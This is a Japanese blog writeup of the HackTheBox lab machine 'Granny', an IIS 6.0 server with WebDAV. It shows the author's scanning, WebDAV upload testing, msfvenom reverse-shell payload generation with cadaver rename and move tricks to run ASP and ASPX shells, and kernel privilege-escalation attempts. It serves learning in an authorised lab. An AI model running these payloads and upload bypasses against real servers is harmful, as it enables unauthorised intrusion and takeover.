---
title: 【Easy/Windows】Granny Writeup(HackTheBox)
date: "2022-07-24"
template: "post"
draft: false
slug: "hackthebox-windows-granny."
category: "HackTheBox"
tags:
  - "HackTheBox"
  - "Windows"
  - "EasyBox"
description: "HackTheBoxのリタイアマシン「Granny」のWriteUpです。"
socialImage: "/media/cards/no-image.png"

---

「Hack The Box」という、ペネトレーションテストの学習プラットフォームを利用してセキュリティについて学んでいます。
「Hack The Box」のランクは、本記事執筆時点でProHackerです。

<img src="../../static/media/2022-07-24-hackthebox-windows-granny/327080.png" alt="Hack The Box">

今回は、HackTheBoxのリタイアマシン「Granny」のWriteUpです。

## 本記事について

**本記事の内容は社会秩序に反する行為を推奨することを目的としたものではございません。**

自身の所有する環境、もしくは許可された環境以外への攻撃の試行は、「不正アクセス行為の禁止等に関する法律（不正アクセス禁止法）」に違反する可能性があること、予めご留意ください。

またすべての発言は所属団体ではなく個人に帰属します。

<!-- omit in toc -->
## もくじ
- [本記事について](#本記事について)
- [探索](#探索)
- [内部探索](#内部探索)
- [まとめ](#まとめ)

## 探索

とりあえずいつも通りポートスキャン。

``` bash
$ sudo sed -i 's/^[0-9].*targethost.htb/10.10.10.15  targethost.htb/g' /etc/hosts
$ nmap -sV -sC -T4 targethost.htb| tee nmap1.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-23 17:48 PDT
Nmap scan report for targethost.htb (10.10.10.15)
Host is up (0.25s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/6.0
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Date: Sun, 24 Jul 2022 00:49:07 GMT
|   WebDAV type: Unknown
|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.76 seconds
```

80番ポートでIISが稼働しているようです。

アクセスしてみたところ、工事中のようです。

![image-20220724095531659](../../static/media/2022-07-24-hackthebox-windows-granny/image-20220724095531659.png)

裏でgobuster回しつつ、探索を進めていきます。

また、ポートスキャンの結果では`WebDAV type: Unknown`とでているので、WebDavが動いているかも確認してみます。

``` bash
$ /usr/bin/davtest -url http://targethost.htb/
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://targethost.htb
********************************************************
NOTE    Random string for this session: iEypK6GgIZG
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://targethost.htb/DavTestDir_iEypK6GgIZG
********************************************************
 Sending test files
PUT     aspx    FAIL
PUT     cfm     SUCCEED:        http://targethost.htb/DavTestDir_iEypK6GgIZG/davtest_iEypK6GgIZG.cfm
PUT     php     SUCCEED:        http://targethost.htb/DavTestDir_iEypK6GgIZG/davtest_iEypK6GgIZG.php
PUT     asp     FAIL
PUT     pl      SUCCEED:        http://targethost.htb/DavTestDir_iEypK6GgIZG/davtest_iEypK6GgIZG.pl
PUT     shtml   FAIL
PUT     jsp     SUCCEED:        http://targethost.htb/DavTestDir_iEypK6GgIZG/davtest_iEypK6GgIZG.jsp
PUT     jhtml   SUCCEED:        http://targethost.htb/DavTestDir_iEypK6GgIZG/davtest_iEypK6GgIZG.jhtml
PUT     html    SUCCEED:        http://targethost.htb/DavTestDir_iEypK6GgIZG/davtest_iEypK6GgIZG.html
PUT     txt     SUCCEED:        http://targethost.htb/DavTestDir_iEypK6GgIZG/davtest_iEypK6GgIZG.txt
PUT     cgi     FAIL
********************************************************
 Checking for test file execution
EXEC    cfm     FAIL
EXEC    php     FAIL
EXEC    pl      FAIL
EXEC    jsp     FAIL
EXEC    jhtml   FAIL
EXEC    html    SUCCEED:        http://targethost.htb/DavTestDir_iEypK6GgIZG/davtest_iEypK6GgIZG.html
EXEC    txt     SUCCEED:        http://targethost.htb/DavTestDir_iEypK6GgIZG/davtest_iEypK6GgIZG.txt

********************************************************
/usr/bin/davtest Summary:
Created: http://targethost.htb/DavTestDir_iEypK6GgIZG
PUT File: http://targethost.htb/DavTestDir_iEypK6GgIZG/davtest_iEypK6GgIZG.cfm
PUT File: http://targethost.htb/DavTestDir_iEypK6GgIZG/davtest_iEypK6GgIZG.php
PUT File: http://targethost.htb/DavTestDir_iEypK6GgIZG/davtest_iEypK6GgIZG.pl
PUT File: http://targethost.htb/DavTestDir_iEypK6GgIZG/davtest_iEypK6GgIZG.jsp
PUT File: http://targethost.htb/DavTestDir_iEypK6GgIZG/davtest_iEypK6GgIZG.jhtml                    
PUT File: http://targethost.htb/DavTestDir_iEypK6GgIZG/davtest_iEypK6GgIZG.html   
PUT File: http://targethost.htb/DavTestDir_iEypK6GgIZG/davtest_iEypK6GgIZG.txt                      
Executes: http://targethost.htb/DavTestDir_iEypK6GgIZG/davtest_iEypK6GgIZG.html                       
Executes: http://targethost.htb/DavTestDir_iEypK6GgIZG/davtest_iEypK6GgIZG.txt 
```

いくつかPUTが使えそうでしたそうでした。

実際に、適当に作成したHTMLファイルをアップロードしたところ、ブラウザ経由で参照できることを確認しました。

``` bash
$ curl -T test.html http://targethost.htb
```

![image-20220724100558683](../../static/media/2022-07-24-hackthebox-windows-granny/image-20220724100558683.png)

というわけでエクスプロイトコードをアップロードします。

ただし、aspファイルのアップロードは制限されているため、直接PUTすることはできません。

そこで、IIS5またはIIS6に存在するWebDavの脆弱性を悪用します。

今回はIIS6.0が使用されているので、以下のようにtxtとしてアップロードしたエクスプロイトファイルを`.asp;.txt`にリネームすることによって、`shell.asp`を実行させることが可能になります。

``` bash
$ msfvenom -p windows/shell/reverse_tcp LHOST=$LHOST LPORT=4444 -f asp > shell.txt

$ cadaver http://targethost.htb
dav:/> put shell.txt
dav:/> copy shell.txt shell.asp;.txt
```

参考：[WebDav - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav#iis5-6-webdav-vulnerability)

これでリバースシェルが取得できると思ったのですが、なぜかすぐにセッションが切れてしまい、シェルの取得にいたりません。

![image-20220724165527786](../../static/media/2022-07-24-hackthebox-windows-granny/image-20220724165527786.png)

`netcat-traditional`を試してみたもののの、こちらも失敗しました。

パケットを見てみると、Victimからインバウンド通信があり、ACKを受け取るところまでで終了しているようです。

![image-20220724180511650](../../static/media/2022-07-24-hackthebox-windows-granny/image-20220724180511650.png)

結局問題が解決できなさそうだったので、aspxを試してみることにしました。

``` bash
$ msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=4445 -o rev.txt
$ cadaver http://targethost.htb
put rev.txt
move rev.txt rev.aspx
```

`.aspx`の場合、PUTはできないけどMOVEはできました。

これでリバースシェルが取得できました。

![image-20220724221130529](../../static/media/2022-07-24-hackthebox-windows-granny/image-20220724221130529.png)

## 内部探索

さっさと権限昇格を目指しましょう。

いつも通り`windows-exploit-suggester`を回します。

``` bash
rm ./*.xls
python windows-exploit-suggester.py --update
ls ./*.xls | (read d; python windows-exploit-suggester.py --systeminfo systeminfo.txt --database $d)
```

沢山でてきました。

よりどりみどりです。

![image-20220724221450276](../../static/media/2022-07-24-hackthebox-windows-granny/image-20220724221450276.png)

色々試してみます。

- NG：
  - [MS15-010](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-010)
  - [MS14-002](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-002)
  - [MS14-058](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-058)
  - [MS14-070](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-070)
  - [MS13-053.exe](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS13-053)
    ※ 成功はしたが恐らく別プロセスのターミナルがSpawnしている
  - [MS11-011](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS11-011)
  - [MS14-40](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-040)

だめそうなのでsearchsploitも使ってみます。

``` bash
$ searchsploit Microsoft Windows Server 2003
----------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                 |  Path
----------------------------------------------------------------------------------------------- ---------------------------------
Microsoft Exchange Server 2000/2003 - Outlook Web Access Script Injection                      | windows/remote/28005.pl
Microsoft Outlook Web Access for Exchange Server 2003 - 'redir.asp' Open Redirection           | windows/remote/32489.txt
Microsoft Outlook Web Access for Exchange Server 2003 - Cross-Site Request Forgery             | windows/dos/34359.html
Microsoft Windows Server 2000 < 2008 - Embedded OpenType Font Engine Remote Code Execution (MS | windows/dos/10068.rb
Microsoft Windows Server 2000/2003 - Code Execution (MS08-067)                                 | windows/remote/7132.py
Microsoft Windows Server 2000/2003 - Recursive DNS Spoofing (1)                                | windows/remote/30635.pl
Microsoft Windows Server 2000/2003 - Recursive DNS Spoofing (2)                                | windows/remote/30636.pl
Microsoft Windows Server 2003 - '.EOT' Blue Screen of Death Crash                              | windows/dos/9417.txt
Microsoft Windows Server 2003 - AD BROWSER ELECTION Remote Heap Overflow                       | windows/dos/16166.py
Microsoft Windows Server 2003 - NetpIsRemote() Remote Overflow (MS06-040) (Metasploit)         | windows/remote/2355.pm
Microsoft Windows Server 2003 - Token Kidnapping Local Privilege Escalation                    | windows/local/6705.txt
Microsoft Windows Server 2003 SP2 - Local Privilege Escalation (MS14-070)                      | windows/local/35936.py
Microsoft Windows Server 2003 SP2 - TCP/IP IOCTL Privilege Escalation (MS14-070)               | windows/local/37755.c
----------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

結果として、`Microsoft Windows Server 2003 - Token Kidnapping Local Privilege Escalation                    | windows/local/6705.txt`以外は実行がうまくいきませんでした。

不可解。。

とはいえとりあえずエクスプロイトはささったのでFlagを取得できました。

![image-20220724235626601](../../static/media/2022-07-24-hackthebox-windows-granny/image-20220724235626601.png)

## まとめ

疲れた。
